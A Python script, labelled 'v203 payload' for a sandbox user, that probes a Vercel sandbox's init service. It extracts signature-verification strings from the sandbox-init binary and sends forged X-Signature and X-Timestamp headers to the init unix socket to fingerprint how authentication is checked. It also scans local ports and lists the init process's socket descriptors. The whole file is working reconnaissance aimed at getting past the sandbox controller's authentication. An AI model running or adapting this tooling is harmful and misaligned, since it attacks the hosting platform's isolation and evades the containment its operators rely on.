# -*- coding: utf-8 -*-
"""v203 payload (sandbox user): sandbox-init 签名验证逻辑指纹
1. 二进制定向字符串提取 (X-Signature/X-Timestamp/ed25519/verify 上下文)
2. 假签名调用矩阵 -> 错误消息差异 = 验证逻辑指纹
3. sandbox-init 监听端口检查"""
import socket, time, json, os, sys, re, signal

signal.alarm(200)

def log(s, maxlen=3500):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

SOCK = '/run/vercel/share/init.sock'

def punix(sp, path, body, t=8, extra=None, ctype='application/connect+json'):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: %s\r\n' % (path, ctype)
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n' % len(b)
        if extra:
            for k, v in extra.items():
                hdrs += '%s: %s\r\n' % (k, v)
        hdrs += '\r\n'
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        return d[:4000]
    except Exception as e:
        return ('EXC %s' % type(e).__name__).encode()

# ============ 1: 二进制上下文提取 ============
log('=== 1 bin ctx ===')
try:
    d = open('/run/vercel/share/sandbox-init', 'rb').read()
    for kw in [b'X-Signature', b'X-Timestamp', b'signature header', b'ed25519', b'Verify', b'verify', b'timestamp', b'Signature']:
        idxs = [m.start() for m in re.finditer(kw, d)]
        log('KW %s hits=%d' % (kw.decode(), len(idxs)))
        for i in idxs[:10]:
            seg = d[max(0, i - 150):i + 300]
            # 只显示可打印部分
            try:
                txt = seg.decode('utf-8', errors='replace')
            except Exception:
                txt = repr(seg)
            log('  @%d: %r' % (i, txt[:380]))
except Exception as e:
    log('BIN EXC %s' % e)

# ============ 2: 假签名矩阵 ============
log('=== 2 fake sig matrix ===')
path = '/vercel.sandbox.spawn.v1.SpawnService/Ping'
now = str(int(time.time()))
cases = [
    ('no-hdr', None),
    ('ts-only', {'X-Timestamp': now}),
    ('sig-only', {'X-Signature': 'AAAA'}),
    ('both-fake', {'X-Signature': 'AAAA', 'X-Timestamp': now}),
    ('both-b64', {'X-Signature': 'QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ==', 'X-Timestamp': now}),
    ('old-ts', {'X-Signature': 'AAAA', 'X-Timestamp': str(int(time.time()) - 3600)}),
    ('fut-ts', {'X-Signature': 'AAAA', 'X-Timestamp': str(int(time.time()) + 3600)}),
    ('ts-str', {'X-Signature': 'AAAA', 'X-Timestamp': 'abc'}),
]
for name, extra in cases:
    pay = punix(SOCK, path, {'name': 'x'}, t=6, extra=extra)
    log('CASE %s -> %r' % (name, pay[:400]))

# ============ 3: sandbox-init TCP 端口 ============
log('=== 3 init ports ===')
try:
    for p in range(23000, 24000, 1):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.15)
        rc = s.connect_ex(('127.0.0.1', p))
        if rc == 0:
            log('OPEN %d' % p)
        s.close()
except Exception as e:
    log('PORT EXC %s' % e)

# ============ 4: /proc/1/fd 快照 ============
log('=== 4 init fds ===')
try:
    for fd in sorted(os.listdir('/proc/1/fd'), key=lambda x: int(x)):
        try:
            tgt = os.readlink('/proc/1/fd/%s' % fd)
            if 'socket' in tgt or 'sock' in tgt:
                log('FD %s -> %s' % (fd, tgt))
        except Exception:
            pass
except Exception as e:
    log('FD EXC %s' % e)

log('V203_DONE')
